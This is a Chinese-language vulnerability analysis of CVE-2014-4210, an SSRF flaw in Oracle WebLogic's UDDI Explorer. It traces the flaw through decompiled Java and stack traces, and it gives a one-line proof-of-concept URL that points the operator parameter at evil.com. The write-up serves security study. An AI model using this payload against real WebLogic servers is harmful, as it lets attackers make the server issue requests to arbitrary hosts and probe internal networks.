---
title: "CVE-2014-4210"
author: ["4shen0ne"]
lastmod: 2024-12-14T14:26:19+08:00
tags: ["java"]
draft: false
---

## 影响范围 {#影响范围}

-   Oracle WebLogic Server 10.0.2.0
-   Oracle WebLogic Server 10.3.6.0


## POC {#poc}

```text
http://localhost:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&btnSubmit=Search&operator=http://evil.com
```


## 漏洞分析 {#漏洞分析}

该漏洞为 SSRF 漏洞，输入点在 `/uddiexplorer/SearchPublicRegistries.jsp` 页面的
operator 参数中。

{{< figure src="/ox-hugo/_20240530_182544screenshot.png" >}}

看一下 SearchPublicRegistries.jsp 对该参数的处理：

{{< figure src="/ox-hugo/_20240530_182626screenshot.png" >}}

从请求中拿到 operator 没做什么处理便传入 search 对象，然后调用了它的 getResponse
方法，那么跟进一下 search 对象的类 `com.bea.uddiexplorer.Search`

首先是 setOperator 方法：

```java
public void setOperator(String var1) {
    try {
        this.m_operator = var1;
        this.setUDDIInquiryURL(var1);
    } catch (Exception var4) {
        String var3 = (new UDDITextFormatter()).uddiExplorerSearchOpException();
        this.log.error(var3, var4);
    }
}
public void setUDDIInquiryURL(String var1) {
    this.UDDI_INQUIRY_URL = var1;
    this.m_inquiry.setURL(this.UDDI_INQUIRY_URL);
}
```

用我们控制的 operator 参数值设置了 m_operator 和 m_inquiry 属性

然后跟进 getResponse 方法：

```java
public Object getResponse(String var1, String var2, String var3, String var4, String var5) throws UDDIException, XML_SoapException {
    Object var6 = null;
    if (var1.equalsIgnoreCase("name")) {
        var6 = this.findBusinessListByName(var2);
    } else if (var1.equalsIgnoreCase("key")) {
        ...}
    ...}
private BusinessList findBusinessListByName(String var1) throws UDDIException, XML_SoapException {
    BusinessList var2 = null;
    FindBusiness var3 = new FindBusiness();
    var3.setName(new Name(var1));
    var2 = this.m_inquiry.findBusiness(var3);
    return var2;
}
```

当 var1 的值是 name 时，则会调用 m_inquiry 属性的 findBusiness 方法，var1 我们可
以通过传入 rdoSearch 来控制，var2 我们也需要通过 txtSearchname 参数来设置一个值

跟进 findBusiness 方法：

{{< figure src="/ox-hugo/_20240530_182849screenshot.png" >}}

此时 sendMessage 的参数已经被污染了，在这个方法中会使用 `BindingFactory#create` 方
法构建一个 Binding 实例用来发送请求，而 create 方法的参数受到 sendMessage 的参数
影响。关键代码如下：

{{< figure src="/ox-hugo/_20240530_182926screenshot.png" >}}

构建 Binding 实例的过程：

```nil
setBindingInfo:63, AbstractBinding (weblogic.webservice.binding)
init:118, Http11ClientBinding (weblogic.webservice.binding.http11)
create:50, BindingFactory (weblogic.webservice.binding)
sendMessage:78, UDDISoapMessage (weblogic.uddi.client.service)
findBusiness:101, Inquiry (weblogic.uddi.client.service)
findBusinessListByName:325, Search (com.bea.uddiexplorer)
getResponse:172, Search (com.bea.uddiexplorer)
...
```

这时 Binding 的 url 属性已经被我们控制，继续执行 `UDDISoapMessage#sendMessage` 触
发 SSRF 请求：

```nil
openConnection:33, Handler (weblogic.net.http)
openConnection:971, URL (java.net)
send:384, Http11ClientBinding (weblogic.webservice.binding.http11)
sendMessage:80, UDDISoapMessage (weblogic.uddi.client.service)
...
```

{{< figure src="/ox-hugo/_20240530_183017screenshot.png" >}}
